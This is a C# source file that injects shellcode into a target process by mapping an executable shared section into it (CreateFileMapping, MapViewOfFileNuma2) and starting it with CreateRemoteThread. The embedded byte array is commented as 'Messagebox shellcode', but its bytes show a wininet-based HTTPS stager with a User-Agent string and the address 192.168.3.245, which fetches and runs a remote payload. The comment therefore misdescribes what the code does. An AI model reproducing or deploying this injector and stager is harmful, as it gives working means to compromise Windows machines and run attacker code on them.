using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static MappingInjection.NativeFunctions;
using static MappingInjection.NativeStructs;

namespace MappingInjection
{
    class MappingInjection
    {
        static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        static readonly UInt32 NUMA_NO_PREFERRED_NODE = 0xffffffff;
        public static bool MappingInject(int InjectProcess_pid)
        {
            /*   Messagebox shellcode   */

            /* length: 927 bytes */
            byte[] buf1 = new byte[927] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xe9, 0x93, 0x00, 0x00, 0x00, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xbb, 0x01, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x79, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x32, 0xc0, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0xba, 0x1f, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x68, 0x80, 0x33, 0x00, 0x00, 0x49, 0x89, 0xe0, 0x41, 0xb9, 0x04, 0x00, 0x00, 0x00, 0x41, 0xba, 0x75, 0x46, 0x9e, 0x86, 0xff, 0xd5, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xb3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x2f, 0x34, 0x68, 0x48, 0x79, 0x00, 0xc8, 0x56, 0xf2, 0x24, 0x77, 0x3e, 0xbd, 0x3a, 0x6c, 0xe0, 0x21, 0x27, 0xa3, 0xad, 0xa4, 0xab, 0x46, 0x66, 0xe6, 0x4c, 0x15, 0xa2, 0xf8, 0x0f, 0x31, 0x65, 0xdc, 0x3d, 0xb7, 0x3d, 0x7d, 0x4e, 0xb5, 0x85, 0x44, 0x51, 0xfc, 0x70, 0x1a, 0x56, 0x3c, 0x71, 0x83, 0x37, 0x87, 0x9a, 0x37, 0xf8, 0x1f, 0xf8, 0x7f, 0xb1, 0xe4, 0x29, 0xeb, 0xb5, 0xf3, 0xee, 0xdd, 0xcb, 0x3e, 0x53, 0xa7, 0x54, 0xfc, 0xf8, 0x30, 0x16, 0x17, 0x5d, 0x50, 0xbe, 0x8f, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x42, 0x4f, 0x49, 0x45, 0x39, 0x3b, 0x45, 0x4e, 0x55, 0x53, 0x4d, 0x53, 0x45, 0x29, 0x0d, 0x0a, 0x00, 0x48, 0xde, 0xa3, 0x1a, 0x91, 0x72, 0xc9, 0x29, 0x3e, 0xc6, 0x70, 0xdf, 0x38, 0x6f, 0xfb, 0xa3, 0x57, 0x18, 0xad, 0x64, 0x09, 0xbb, 0x1a, 0xe5, 0xc0, 0xe4, 0x7e, 0x90, 0xdb, 0x8d, 0x07, 0xaf, 0xa6, 0xa7, 0x12, 0xe7, 0xbd, 0xda, 0x9b, 0x21, 0xfc, 0x19, 0xb6, 0x3d, 0xbb, 0x74, 0xf0, 0xe7, 0x7d, 0x5a, 0x12, 0x89, 0x9e, 0x16, 0xd4, 0x95, 0xa3, 0x71, 0x70, 0x1d, 0x04, 0x02, 0x4b, 0xb2, 0xf4, 0x7e, 0xda, 0xda, 0x15, 0xfa, 0x7b, 0x16, 0xd1, 0x5d, 0xfb, 0x44, 0xbf, 0xc9, 0xad, 0xf3, 0xdc, 0x6c, 0x1c, 0xac, 0xac, 0x1c, 0x97, 0xcf, 0x75, 0xe1, 0x25, 0x7d, 0x77, 0x07, 0x25, 0x19, 0x5f, 0xdd, 0xf6, 0x05, 0xbc, 0x82, 0xb5, 0x86, 0x32, 0x4d, 0x1a, 0x86, 0x09, 0x58, 0xd2, 0x28, 0x03, 0x6c, 0x67, 0x37, 0x2e, 0x71, 0xd8, 0xc7, 0xbe, 0xb3, 0x36, 0x98, 0x22, 0xce, 0x4d, 0xea, 0x67, 0x97, 0x44, 0xc5, 0x0b, 0x1c, 0x1a, 0x86, 0xd1, 0x43, 0x1f, 0x5d, 0x6b, 0xa5, 0x74, 0xb1, 0x1d, 0x63, 0xc4, 0x92, 0x3f, 0x34, 0x53, 0x5d, 0x72, 0x80, 0xda, 0xec, 0xf1, 0x86, 0x68, 0xfb, 0xb9, 0xc4, 0x5e, 0xa6, 0xf2, 0x3c, 0x8d, 0xa9, 0xf4, 0x2a, 0xa8, 0xb9, 0xb4, 0xcc, 0x30, 0x51, 0x41, 0x19, 0x2a, 0x77, 0x17, 0xb4, 0x5e, 0x85, 0x29, 0xa4, 0xfa, 0x4c, 0x28, 0x86, 0x04, 0x47, 0x47, 0x9f, 0xf3, 0x9d, 0xe0, 0x5a, 0x81, 0x84, 0xe0, 0xe6, 0x8b, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x7f, 0xfd, 0xff, 0xff, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x33, 0x2e, 0x32, 0x34, 0x35, 0x00, 0x51, 0x09, 0xbf, 0x6d };


            /*
                HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);

                LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));

                memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));

                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 19752);

                LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);

                HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);

                UnmapViewOfFile(lpMapAddress);
                CloseHandle(hMapping);
                return 0;
            */

            IntPtr Mapping_handle = CreateFileMapping(
                INVALID_HANDLE_VALUE, 
                IntPtr.Zero, 
                FileMapProtection.PageExecuteReadWrite, 
                0,
                (uint)buf1.Length,
                null
            );

            IntPtr MapViewOfFile_address = MapViewOfFile(Mapping_handle, FileMapAccessType.Write, 0, 0, (uint)buf1.Length);
            Marshal.Copy(buf1, 0, MapViewOfFile_address, buf1.Length);

            IntPtr OpenProcess_handle = OpenProcess((uint)ProcessAccessFlags.All, false, InjectProcess_pid);
            // Maps a view of a file or a pagefile-backed section into the address space of the specified process.
            IntPtr MapRemote_address = MapViewOfFileNuma2(
                Mapping_handle, 
                OpenProcess_handle, 
                0, 
                IntPtr.Zero, 
                0, 
                0, 
                (uint)AllocationProtect.PAGE_EXECUTE_READ,
                NUMA_NO_PREFERRED_NODE);

            IntPtr RemoteThread_id = IntPtr.Zero;
            IntPtr RemoteThread_handle = CreateRemoteThread(
                OpenProcess_handle, 
                IntPtr.Zero, 
                0, 
                MapRemote_address, 
                IntPtr.Zero, 
                0, 
                out RemoteThread_id);

            Console.WriteLine(RemoteThread_id);
            if (RemoteThread_id != IntPtr.Zero)
            {
                return true;
            }
            else
            {
                return false;
            }
            
    
        }
    }
}
